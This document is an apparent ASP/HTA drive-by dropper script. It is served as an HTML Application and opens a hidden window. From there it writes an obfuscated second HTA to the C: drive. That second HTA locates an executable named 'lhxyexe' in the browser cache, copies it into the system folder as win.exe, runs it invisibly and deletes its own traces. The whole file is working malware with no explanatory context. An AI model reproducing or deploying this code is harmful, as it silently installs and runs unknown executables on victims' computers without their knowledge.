<%response.ContentType="application/hta"%>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>

<HTA:APPLICATION caption="no" border="none" 
windowState="minimize" >
<script LaNGUAGE="VBScript">
Set g_fs = CreateObject("Scripting.FileSystemObject")

Set tf = g_fs.CreateTextFile("c:\win.hta",true)
tf.write "<HTA:APPLICATION caption=" &amp; CHR(34)&amp; "no" &amp; CHR(34)&amp; " border=" &amp; CHR(34)&amp; "none" &amp; CHR(34)&amp; " showintaskbar=" &amp; CHR(34)&amp; "no" &amp; CHR(34)&amp; " >" &amp;chr(13)&amp;chr(10)

tf.write "<object id='wsh' cl"&amp; chr(97)&amp;"ssid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>"&amp;chr(13)&amp;chr(10)
tf.write "<" &amp; "script LANGUAGE=" &amp; CHR(34)&amp; "VBScript" &amp; CHR(34)&amp;">" &amp;chr(13)&amp;chr(10)

tf.write "on error resume next"&amp;chr(13)&amp;chr(10)
tf.write "window.moveTo 0,0"&amp;chr(13)&amp;chr(10)
tf.write "window.resizeTo 0,0 "&amp;chr(13)&amp;chr(10)

tf.write "dim exepath"&amp;chr(13)&amp;chr(10)
tf.write "Function Search(objFolder) "&amp;chr(13)&amp;chr(10)
tf.write "Dim objSubFolder"&amp;chr(13)&amp;chr(10)

tf.write "For Each objFile in objFolder.Files"&amp;chr(13)&amp;chr(10)
tf.write "If InStr(1, objfile.name, " &amp; CHR(34)&amp; "lhxyexe" &amp; CHR(34)&amp; ", vbtextcompare) then"&amp;chr(13)&amp;chr(10)

tf.write "set filecp = objg_fso.getfile(objfile.path)"&amp;chr(13)&amp;chr(10)
tf.write "filecp.copy (exepath)"&amp;chr(13)&amp;chr(10)
tf.write "exit for"&amp;chr(13)&amp;chr(10)

tf.write "End If"&amp;chr(13)&amp;chr(10)
tf.write "Next "&amp;chr(13)&amp;chr(10)
tf.write "For Each objSubFolder in objFolder.SubFolders "&amp;chr(13)&amp;chr(10)

tf.write "Search objSubFolder"&amp;chr(13)&amp;chr(10)
tf.write "Next"&amp;chr(13)&amp;chr(10)
tf.write "End Function"&amp;chr(13)&amp;chr(10)

tf.write "Set objg_fso = CreateObject(" &amp; CHR(34)&amp; "Scripting.FileSystemObject" &amp; CHR(34)&amp; ")"&amp;chr(13)&amp;chr(10)
tf.write "str=WSH.regread(" &amp; CHR(34)&amp; "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\cache" &amp; CHR(34)&amp; ")"&amp;chr(13)&amp;chr(10)

tf.write "set tempfolder = objg_fso.getfolder(str)"&amp;chr(13)&amp;chr(10)
tf.write "set othisfolder = objg_fso.GetSpecialFolder(1)" &amp;chr(13)&amp;chr(10)
tf.write "exepath=othisfolder.path &amp; "&amp; chr(34) &amp; "win.exe" &amp; chr(34) &amp;chr(13)&amp;chr(10)

tf.write "search tempfolder"&amp;chr(13)&amp;chr(10)
tf.write "wsh.run (exepath)"&amp;chr(13)&amp;chr(10)
tf.write "wsh.run " &amp; CHR(34)&amp; "command.com /c del c:\win.hta" &amp; CHR(34)&amp; " ,0"&amp;chr(13)&amp;chr(10)

tf.write "window.close()"&amp;chr(13)&amp;chr(10)
tf.write "<" &amp;chr(47)&amp; "script>"&amp;chr(13)&amp;chr(10)
tf.close

wsh.run "c:\win.hta",0
window.close ()
</script>